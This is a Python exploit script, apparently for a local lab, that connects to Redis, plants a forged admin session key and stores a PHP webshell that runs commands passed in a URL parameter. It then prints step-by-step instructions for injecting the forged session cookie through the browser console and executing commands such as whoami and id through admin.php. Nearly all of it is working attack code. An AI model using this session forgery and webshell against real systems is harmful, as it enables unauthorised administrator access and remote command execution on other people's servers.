#!/usr/bin/env python3
import redis
import json

def inject_admin():
    print("="*50)
    print("REDIS INJECTION EXPLOIT")
    print("="*50)
    
    # Try to connect to Redis
    print("[*] Connecting to Redis...")
    
    try:
        # Try default port
        r = redis.Redis(host='localhost', port=6379, decode_responses=True)
        
        if r.ping():
            print("[✓] Connected to Redis on localhost:6379")
        else:
            print("[-] Cannot connect to Redis")
            return False
    except redis.ConnectionError:
        print("[!] Redis not on default port. Trying alternatives...")
        
        # Try different ports
        ports = [6379, 6380, 6378, 6377]
        connected = False
        
        for port in ports:
            try:
                r = redis.Redis(host='localhost', port=port, socket_timeout=2)
                if r.ping():
                    print(f"[✓] Found Redis on port {port}")
                    connected = True
                    break
            except:
                continue
        
        if not connected:
            print("[-] Could not connect to Redis")
            print("[*] Is Redis running? Start it with:")
            print("    - docker-compose up -d redis")
            print("    - Or: redis-server")
            return False
    
    # Create admin session
    print("\n[*] Creating admin session...")
    
    session_id = "admin_demo"
    session_data = json.dumps({"user": "admin", "role": "admin"})
    redis_key = f"session_{session_id}"
    
    # Inject into Redis
    r.set(redis_key, session_data)
    
    # Verify
    stored = r.get(redis_key)
    
    if stored == session_data:
        print(f"[✓] Admin session injected!")
        print(f"    Key: {redis_key}")
        print(f"    Data: {stored}")
    else:
        print(f"[-] Injection failed")
        print(f"    Expected: {session_data}")
        print(f"    Got: {stored}")
        return False
    
    # Create webshell
    print("\n[*] Creating webshell for RCE...")
    
    webshell = '''<?php
if (isset($_GET['cmd'])) {
    echo '<pre style="background:black;color:lime;padding:10px;">';
    system($_GET['cmd']);
    echo '</pre>';
} else {
    echo '<h3>Webshell Ready</h3>';
    echo '<p>Use ?cmd=command</p>';
}
?>'''
    
    r.set('session_webshell_demo', webshell)
    
    if r.get('session_webshell_demo'):
        print("[✓] Webshell created!")
    else:
        print("[-] Failed to create webshell")
    
    # Show instructions
    print("\n" + "="*50)
    print("EXPLOIT SUCCESSFUL!")
    print("="*50)
    
    print(f"\nAdmin Session Created:")
    print(f"  Cookie Name: SID")
    print(f"  Cookie Value: {session_id}")
    
    print(f"\nTo use:")
    print(f"  1. Open http://localhost:8080")
    print(f"  2. Press F12 → Console")
    print(f"  3. Paste:")
    print(f'     document.cookie = "SID={session_id}; path=/; domain=localhost"')
    print(f"  4. Visit: http://localhost:8080/admin.php")
    
    print(f"\nTest RCE:")
    print(f"  http://localhost:8080/admin.php?execute=eval&cmd=whoami")
    print(f"  http://localhost:8080/admin.php?execute=eval&cmd=id")
    print(f"  http://localhost:8080/admin.php?execute=eval&cmd=ls -la")
    
    return True

if __name__ == "__main__":
    try:
        # Check if redis module is installed
        import redis
    except ImportError:
        print("[!] Redis module not installed.")
        print("[*] Install it with: pip install redis")
        exit(1)
    
    inject_admin()